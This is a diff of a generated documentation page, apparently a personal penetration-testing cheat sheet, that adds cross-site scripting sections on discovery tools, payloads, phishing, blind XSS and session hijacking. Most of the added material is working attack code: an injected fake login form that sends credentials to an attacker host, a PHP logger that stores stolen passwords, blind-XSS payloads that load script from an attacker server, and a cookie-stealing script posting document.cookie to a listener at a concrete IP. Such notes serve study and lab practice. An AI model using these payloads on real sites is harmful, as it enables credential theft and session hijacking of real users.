@@ -16,7 +16,7 @@
       
       
       <link rel="icon" href="../../assets/images/favicon.png">
-      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.20">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.16">
     
     
       
@@ -24,7 +24,7 @@
       
     
     
-      <link rel="stylesheet" href="../../assets/stylesheets/main.e53b48f4.min.css">
+      <link rel="stylesheet" href="../../assets/stylesheets/main.7e37652d.min.css">
       
       
 
@@ -516,6 +516,30 @@
 </li>
       
         <li class="md-nav__item">
+  <a href="#xss-discovery-methods" class="md-nav__link">
+    <span class="md-ellipsis">
+      XSS Discovery Methods
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="XSS Discovery Methods">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#xss-strike" class="md-nav__link">
+    <span class="md-ellipsis">
+      XSS Strike
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#xss-payloads" class="md-nav__link">
     <span class="md-ellipsis">
       XSS Payloads
@@ -525,9 +549,36 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#commands" class="md-nav__link">
+  <a href="#phishing" class="md-nav__link">
     <span class="md-ellipsis">
-      Commands
+      Phishing
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#blind-xss-detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Blind XSS detection
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#session-hijaking" class="md-nav__link">
+    <span class="md-ellipsis">
+      Session hijaking
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#useful-commands" class="md-nav__link">
+    <span class="md-ellipsis">
+      Useful Commands
     </span>
   </a>
   
@@ -1131,6 +1182,30 @@
 </li>
       
         <li class="md-nav__item">
+  <a href="#xss-discovery-methods" class="md-nav__link">
+    <span class="md-ellipsis">
+      XSS Discovery Methods
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="XSS Discovery Methods">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#xss-strike" class="md-nav__link">
+    <span class="md-ellipsis">
+      XSS Strike
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#xss-payloads" class="md-nav__link">
     <span class="md-ellipsis">
       XSS Payloads
@@ -1140,9 +1215,36 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#commands" class="md-nav__link">
+  <a href="#phishing" class="md-nav__link">
     <span class="md-ellipsis">
-      Commands
+      Phishing
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#blind-xss-detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Blind XSS detection
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#session-hijaking" class="md-nav__link">
+    <span class="md-ellipsis">
+      Session hijaking
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#useful-commands" class="md-nav__link">
+    <span class="md-ellipsis">
+      Useful Commands
     </span>
   </a>
   
@@ -1198,6 +1300,21 @@
 </tr>
 </tbody>
 </table>
+<h2 id="xss-discovery-methods">XSS Discovery Methods</h2>
+<ul>
+<li>Nessus</li>
+<li>Burp Pro</li>
+<li>ZAP</li>
+<li><a href="https://github.com/s0md3v/XSStrike">XSS Strike</a></li>
+<li><a href="https://github.com/epsylon/xsser">XSSer</a></li>
+</ul>
+<h3 id="xss-strike">XSS Strike</h3>
+<pre><code class="language-bash">git clone https://github.com/s0md3v/XSStrike.git
+cd XSStrike
+pip install -r requirements.txt
+python xsstrike.py
+python xsstrike.py -u &quot;http://SERVER_IP:PORT/index.php?task=test&quot;
+</code></pre>
 <h2 id="xss-payloads">XSS Payloads</h2>
 <table>
 <thead>
@@ -1212,6 +1329,10 @@
 <td>windows.origin shows the URL of the stored XSS if IFrames being used</td>
 </tr>
 <tr>
+<td><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></td>
+<td>document.cookie shows the cookie of the current page/document</td>
+</tr>
+<tr>
 <td><code>&lt;plaintext&gt;</code></td>
 <td>Stops the rendoring of any HTML code that comes after</td>
 </tr>
@@ -1221,7 +1342,7 @@
 </tr>
 <tr>
 <td><code>&lt;img src="" onerror=alert(window.origin)&gt;</code></td>
-<td>HTML-based XSS Payload</td>
+<td>HTML-based XSS Payload. Use when script tag gets sanitised</td>
 </tr>
 <tr>
 <td><code>&lt;script&gt;document.body.style.background = "#141d2b"&lt;/script&gt;</code></td>
@@ -1253,7 +1374,110 @@
 </tr>
 </tbody>
 </table>
-<h2 id="commands">Commands</h2>
+<ul>
+<li><a href="https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/">PayloadAllTheThings</a></li>
+<li><a href="https://github.com/payloadbox/xss-payload-list">PayloadBox</a></li>
+</ul>
+<p><strong>Note:</strong> XSS can be injected into any input in the HTML page, which is not exclusive to HTML input fields, but may also be in HTTP headers like the Cookie or User-Agent (i.e., when their values are displayed on the page).</p>
+<h2 id="phishing">Phishing</h2>
+<p>Initial step is to identify a working payload, ie:</p>
+<pre><code class="language-js">'&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+<p>Example of a basic HTML login form:</p>
+<pre><code class="language-html">&lt;h3&gt;Please login to continue&lt;/h3&gt;
+&lt;form action=http://OUR_IP&gt;
+    &lt;input type=&quot;username&quot; name=&quot;username&quot; placeholder=&quot;Username&quot;&gt;
+    &lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;Password&quot;&gt;
+    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot;&gt;
+&lt;/form&gt;
+</code></pre>
+<p>Which can be minified and put into JS:</p>
+<pre><code class="language-js">document.write('&lt;h3&gt;Please login to continue&lt;/h3&gt;&lt;form action=http://OUR_IP&gt;&lt;input type=&quot;username&quot; name=&quot;username&quot; placeholder=&quot;Username&quot;&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot;&gt;&lt;/form&gt;');
+</code></pre>
+<p>To make the new form more likely to succeed, the original page HTML code should be removed:</p>
+<p>Original code example:</p>
+<pre><code class="language-html">&lt;form role=&quot;form&quot; action=&quot;index.php&quot; method=&quot;GET&quot; id='urlform'&gt;
+    &lt;input type=&quot;text&quot; placeholder=&quot;Image URL&quot; name=&quot;url&quot;&gt;
+&lt;/form&gt;
+</code></pre>
+<p>Removal code:</p>
+<pre><code class="language-js">document.getElementById('urlform').remove()
+</code></pre>
+<p>Adding a comment tag to the end of the payload will remove proceeding code:</p>
+<pre><code class="language-html">...PAYLOAD... &lt;!-- 
+</code></pre>
+<p>Complete injection code:</p>
+<pre><code class="language-js">'&gt;&lt;script&gt;document.write('&lt;h3&gt;Please login to continue&lt;/h3&gt;&lt;form action=http://PWNIP:PWNPO&gt;&lt;input type=&quot;username&quot; name=&quot;username&quot; placeholder=&quot;Username&quot;&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot;&gt;&lt;/form&gt;');document.getElementById('urlform').remove();&lt;/script&gt;&lt;!--
+</code></pre>
+<p>The payload should then be added to the URL parameter, encoded, and sent to the victim:</p>
+<pre><code class="language-url">http://PWNIP/phishing/index.php?url=%27%3E%3Cscript%3Edocument.write%28%27%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2FPWNIP%3APWNPO%3E%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E%27%29%3Bdocument.getElementById%28%27urlform%27%29.remove%28%29%3B%3C%2Fscript%3E%3C%21--
+</code></pre>
+<p>We can then use a basic PHP listener that will retrieve the creds and send the victim to the origin page, simulating a successful login:</p>
+<p><strong>index.php</strong></p>
+<pre><code class="language-php">&lt;?php
+if (isset($_GET['username']) &amp;&amp; isset($_GET['password'])) {
+    $file = fopen(&quot;creds.txt&quot;, &quot;a+&quot;);
+    fputs($file, &quot;Username: {$_GET['username']} | Password: {$_GET['password']}\n&quot;);
+    header(&quot;Location: http://SERVER_IP/phishing/index.php&quot;);
+    fclose($file);
+    exit();
+}
+?&gt;
+</code></pre>
+<pre><code class="language-bash">mkdir /tmp/tmpserver
+cd /tmp/tmpserver
+vim index.php #write index.php to file here
+sudo php -S 0.0.0.0:8080
+</code></pre>
+<h2 id="blind-xss-detection">Blind XSS detection</h2>
+<p>Occur with forms only accessible by certain user:
+- Contact Forms
+- Reviews
+- User Details
+- Support Tickets
+- HTTP User-Agent header</p>
+<p>We can detect the presence of blind XSS by starting a netcat listener or php server and entering a script that calls to it:</p>
+<pre><code class="language-html">&lt;script src=&quot;http://OUR_IP/script.js&quot;&gt;&lt;/script&gt;
+</code></pre>
+<p>If the form has multiple fields we would detect which field is vulnerable like so:</p>
+<pre><code class="language-html">&lt;script src=http://OUR_IP/fullname&gt;&lt;/script&gt; #Used in the fullname field
+&lt;script src=http://OUR_IP/username&gt;&lt;/script&gt; #Used in the username field
+</code></pre>
+<p><strong>Tip:</strong> Email maybe validated on the front-end and back-end, thus is not vulnerable, and we can skip testing it. Likewise, we may skip the password field, as passwords are usually hashed and not usually shown in cleartext.</p>
+<p>We made need to try multiple payload types, one at a time and appending each field name:</p>
+<pre><code class="language-html">&lt;script src=http://OUR_IP&gt;&lt;/script&gt;
+'&gt;&lt;script src=http://OUR_IP&gt;&lt;/script&gt;
+&quot;&gt;&lt;script src=http://OUR_IP&gt;&lt;/script&gt;
+javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
+&lt;script&gt;function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener(&quot;load&quot;, b);a.open(&quot;GET&quot;, &quot;//OUR_IP&quot;);a.send();&lt;/script&gt;
+&lt;script&gt;$.getScript(&quot;http://OUR_IP&quot;)&lt;/script&gt;
+</code></pre>
+<h2 id="session-hijaking">Session hijaking</h2>
+<p>If we successfully find a blind XSS vulnerability we can attempt a session hijaking attack.</p>
+<p>Create two files:</p>
+<p><strong>script.js</strong></p>
+<pre><code class="language-js">new Image().src='http://PWNIP:PWNPO/index.php?c='+document.cookie;
+</code></pre>
+<p><strong>index.php</strong></p>
+<pre><code class="language-php">&lt;?php
+if (isset($_GET['c'])) {
+    $list = explode(&quot;;&quot;, $_GET['c']);
+    foreach ($list as $key =&gt; $value) {
+        $cookie = urldecode($value);
+        $file = fopen(&quot;cookies.txt&quot;, &quot;a+&quot;);
+        fputs($file, &quot;Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n&quot;);
+        fclose($file);
+    }
+}
+?&gt;
+</code></pre>
+<p>Start a php server:</p>
+<pre><code class="language-bash">php -S 0.0.0.0:PWNPO
+</code></pre>
+<p>Use identified exploit to call script.js, ie:</p>
+<pre><code class="language-js">&quot;&gt;&lt;script src=http://PWNIP:PWNPO/script.js&gt;&lt;/script&gt;
+</code></pre>
+<h2 id="useful-commands">Useful Commands</h2>
 <table>
 <thead>
 <tr>
@@ -1276,6 +1500,11 @@
 </tr>
 </tbody>
 </table>
+<p>Use cat to write to files:</p>
+<pre><code class="language-bash">cat &lt;&lt; 'EOF' &gt; script.js
+new Image().src='http://10.10.14.41:9001/index.php?c=' + document.cookie;
+EOF
+</code></pre>
 <h2 id="useful-links">Useful Links</h2>
 <ul>
 <li><a href="https://owasp.org/www-community/attacks/xss/">OWASP XSS</a></li>
@@ -1329,10 +1558,10 @@
     
     
       
-      <script id="__config" type="application/json">{"base": "../..", "features": [], "search": "../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+      <script id="__config" type="application/json">{"base": "../..", "features": [], "search": "../../assets/javascripts/workers/search.d50fe291.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
     
     
-      <script src="../../assets/javascripts/bundle.f55a23d4.min.js"></script>
+      <script src="../../assets/javascripts/bundle.50899def.min.js"></script>
       
     
   </body>
